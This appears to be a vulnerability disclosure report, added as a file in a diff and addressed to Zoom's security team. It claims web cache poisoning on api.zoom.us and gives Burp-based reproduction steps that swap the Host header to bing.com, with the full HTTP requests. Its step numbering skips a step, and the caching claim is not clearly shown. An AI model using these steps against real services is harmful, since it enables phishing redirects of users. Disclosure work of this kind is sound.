@@ -1,0 +1,43 @@
+Hello Zoom Security Team,
+
+Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server
+and cache so that a harmful HTTP response is served to other users.
+
+I found web cache poisoning in your domain https://api.zoom.us
+
+Steps to Reproduce:
+1) Navigate to https://api.zoom.us
+
+2) Go to proxy tool burp, make intercept on & Capture the request
+GET / HTTP/1.1
+Host: api.zoom.us
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: <removed>
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+3) Change Host to bing.com and forward the request.
+GET / HTTP/1.1
+Host: bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: <removed>
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+5) Now go to the website and click on hyperlinks
+
+6) You will be redirected to bing.com
+
+Impact
+This could be used for the phishing attacks. An attacker can set up a Domain which looks similar to
+zoom.com and spread this poisoned link via facebook or other forums, fooling users to follow it and 
+get redirected to the evil attackers domain.
+
